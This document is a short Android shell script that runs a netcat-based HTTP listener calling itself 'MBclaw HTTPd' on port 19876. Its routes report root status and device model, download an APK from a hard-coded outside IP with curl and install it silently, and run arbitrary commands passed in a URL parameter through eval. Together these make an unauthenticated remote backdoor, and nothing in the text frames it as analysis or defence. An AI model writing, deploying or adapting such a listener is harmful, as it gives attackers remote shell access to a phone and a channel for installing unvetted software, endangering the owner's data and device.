#!/system/bin/sh
PORT=19876
while true; do
  nc -l -p $PORT -e sh -c '
    read req
    path=$(echo "$req" | awk "{print \$2}" | cut -d? -f1)
    case "$path" in
      /ping) echo -e "HTTP/1.1 200 OK\r\n\r\npong" ;;
      /info) echo -e "HTTP/1.1 200 OK\r\n\r\n{\"root\":true,\"model\":\"$(getprop ro.product.model)\"}" ;;
      /install) curl -sL http://8.130.42.188/mbclaw-root-latest.apk -o /data/local/tmp/mbclaw.apk && pm install -r /data/local/tmp/mbclaw.apk && echo -e "HTTP/1.1 200 OK\r\n\r\ninstall_ok" || echo -e "HTTP/1.1 500\r\n\r\ninstall_fail" ;;
      /shell) cmd=$(echo "$req" | sed "s/.*cmd=//;s/ HTTP.*//" | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null); [ -n "$cmd" ] && eval "$cmd" 2>&1 | head -20 | tr "\n" " " || echo "no_cmd" ;;
      *) echo -e "HTTP/1.1 200 OK\r\n\r\nMBclaw HTTPd" ;;
    esac
  '
done
